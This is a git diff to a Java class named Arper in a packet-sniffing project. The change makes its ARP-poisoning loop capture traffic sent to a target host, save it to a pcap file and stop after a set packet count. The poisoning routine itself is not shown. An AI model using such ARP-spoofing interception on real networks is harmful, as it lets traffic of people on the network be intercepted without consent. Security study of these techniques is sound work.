@@ -4,6 +4,7 @@ import org.pcap4j.util.MacAddress;
 
 import com.pkt.sniff.packets.ARP;
 import com.pkt.sniff.packets.EthernetFrame;
+import com.pkt.sniff.utils.DumpPcap;
 import com.pkt.sniff.utils.NetworkUtils;
 import com.pkt.sniff.utils.Utils;
 
@@ -44,28 +45,40 @@ public class Arper {
         this.gatewayMac = gatewayMac;
     }
 
-    public void run() {
+    public void run(int packetCount) {
         summary();
 
         Sniff sniff = new Sniff(nif);
+        DumpPcap dumper = new DumpPcap(nif);
+
         sniff.setFilter("not arp and dst host " + targetIP);
-
         System.out.println("\nRunning...");
-        Utils.sleep(2000);
 
+        int num = 0;
         while (true) {
             try {
                 poison();
 
-                Packet p = sniff.capturePacket();
-                System.out.println(p);
+                Packet packet = sniff.capturePacket();
+                if (packet == null) {
+                    continue;
+                } else {
+                    num++;
+                    System.out.println(packet);
+                    dumper.dump(packet);
+                }
+
+                if (num >= packetCount) {
+                    sniff.close();
+                    dumper.close();
+                    break;
+                }
             } catch (Exception e) {
                 e.printStackTrace();
                 break;
             }
         }
 
-        sniff.closeHandle();
         System.out.println("Restoring...\n");
         restore();
 
